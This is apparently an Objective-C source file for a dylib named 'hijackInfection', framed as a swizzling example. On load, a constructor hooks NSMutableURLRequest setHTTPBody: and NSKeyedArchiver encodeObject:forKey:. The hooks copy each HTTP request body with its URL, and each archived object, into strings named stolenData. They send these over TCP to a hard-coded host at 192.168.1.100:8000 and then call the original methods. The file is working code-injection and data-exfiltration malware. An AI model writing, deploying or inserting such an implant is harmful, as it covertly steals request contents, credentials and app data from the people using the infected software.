/* hijackInfection: a simple swizzling example in the form of a dylib
 * init routine 
 */

#include <Foundation/Foundation.h>
#include <Foundation/NSKeyedArchiver.h>
#include <objc/objc.h>
#include <objc/runtime.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/in.h>

#define HOST "192.168.1.100"
#define PORT 8000

IMP __mutableURLRequestIMP;
IMP __keyedArchiverEncodeObjectIMP;

void sendInterceptedData(NSString *stolenData)
{

    NSLog(@"%s %@", __func__, stolenData);
    char *buf = strdup([ stolenData UTF8String ]);
    struct sockaddr_in addr;
    size_t nr = strlen(buf);
    size_t nw;
    int addr_len;
    int yes = 1;
    int r, wfd;
    off_t off;

    wfd = socket(AF_INET, SOCK_STREAM, 0);
    memset(&addr, 0, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(HOST);
    addr.sin_port = htons(PORT);
    addr_len = sizeof(struct sockaddr_in);

    r = connect(wfd, (struct sockaddr *)&addr, addr_len);
    if (r < 0) {
        close(wfd);
        free(buf);
        return;
    }

    setsockopt(wfd, SOL_SOCKET, TCP_NODELAY, &yes, sizeof(int));

    for (off = 0; nr; nr -= nw, off += nw) {
        if ((nw = send(wfd, buf + off, (size_t)nr, 0)) < 0)
        {
            close(wfd);
            free(buf);
            return;
        }
    }

    free(buf);
    close(wfd);
}

void setHTTPBody(id self, SEL op, NSData *data)
{
    NSMutableURLRequest *theRequest = (NSMutableURLRequest *) self;
    NSString *stolenData = [ NSString stringWithFormat: @"%s %@ => %s\n",
        __func__, [ theRequest.URL absoluteString ], [ data bytes ] ];

    sendInterceptedData(stolenData);
    (__mutableURLRequestIMP)(self, op, data);
}

id keyedArchiverEncodeObject(id self, SEL op, id object, NSString *key)
{
    NSString *stolenData = [ NSString stringWithFormat: @"%s %@ => %@",
        __func__, key, [ object description ] ];
    sendInterceptedData(stolenData);
    return (__keyedArchiverEncodeObjectIMP)(self, op, object, key);
}

static void __attribute__((constructor)) initialize(void) {

    NSLog(@"%s hijackInfection loaded", __func__);

    /*
     *  NSMutableURLRequest 
     */

    __mutableURLRequestIMP = class_replaceMethod(
        objc_getClass("NSMutableURLRequest"),
        sel_registerName("setHTTPBody:"),
        (IMP)setHTTPBody,
        "@:@");

    if (!__mutableURLRequestIMP) {
        NSLog(@"%s failed to inject to setHTTPBody:", __func__);
    } else {
        NSLog(@"%s inject setHTTPBody: OK", __func__);
    }


    /*
     * NSKeyedArchiver
     */

    __keyedArchiverEncodeObjectIMP = class_replaceMethod(
        objc_getClass("NSKeyedArchiver"),
        sel_registerName("encodeObject:forKey:"),
        (IMP)keyedArchiverEncodeObject,
        "@:@@");
    if (!__keyedArchiverEncodeObjectIMP) {
        NSLog(@"%s failed to inject to NSKeyedArchiver "
            "encodeObject:forKey:", __func__);
    } else {
        NSLog(@"%s inject NSKeyedArchiver encodeObject:forKey: OK", __func__);
    }
}
